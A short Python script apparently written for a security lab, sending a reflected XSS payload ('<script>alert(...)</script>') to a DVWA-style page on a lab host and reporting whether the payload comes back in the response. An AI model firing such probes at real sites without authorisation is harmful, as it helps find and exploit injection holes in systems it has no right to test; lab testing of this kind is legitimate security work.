import requests
import re

def test_xss(url, payload):
    try:
        response = requests.get(url + payload)
        if re.search(payload, response.text):
            return True #vulnerable.
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

base_url = "http://snf-3406.vlab.ac.ke/vulnerabilities/xss_r/?name="
payload = "<script>alert('XSS')</script>"

if test_xss(base_url, payload):
    print(f"XSS vulnerability detected with payload: {payload}")
else:
    print(f"No XSS vulnerability detected with payload: {payload}")